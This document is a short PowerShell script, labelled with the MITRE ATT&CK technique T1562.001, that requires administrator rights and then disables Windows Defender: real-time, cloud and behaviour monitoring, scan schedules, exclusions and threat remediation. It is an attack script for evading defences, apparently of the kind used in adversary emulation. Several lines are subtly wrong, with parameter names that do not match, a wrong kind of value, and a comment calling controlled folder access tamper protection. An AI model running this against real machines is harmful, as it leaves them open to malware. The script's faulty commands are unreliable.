# T1562.001 - Impair Defenses: Disable or Modify Tools


if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) 
{ 
    Write-Warning "You do not have Administrator rights to run this script!`nPlease re-run this script as an Administrator!"
    Break 
}

# Completely disable Windows Defender on a computer
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true
# Disable cloud protection
Set-MpPreference -MAPSReporting Disabled
# Disable threat behavior
Set-MpPreference -EnableBehaviorMonitoring Disabled
# Disable threat detection
Set-MpPreference -EnableNetworkProtection Disabled
# Disable threat scan
Set-MpPreference -DisableArchiveScanning Disabled
# Disable tamper protection
Set-MpPreference -EnableControlledFolderAccess Disabled
# Remove excluded file types
Set-MpPreference -ExclusionExtension ""
# Remove excluded processes
Set-MpPreference -ExclusionProcess ""
# Remove excluded paths
Set-MpPreference -ExclusionPath ""
# Remove excluded network paths
Set-MpPreference -ExclusionPathOnNetwork ""
# Disable scan schedule
Set-MpPreference -ScheduleScanType 0
# Disable scan time
Set-MpPreference -ScheduleScanTime ""
# Disable scan day
Set-MpPreference -ScheduleScanDay ""
# Disable action on detected threats
Set-MpPreference -DisableRemediation $true
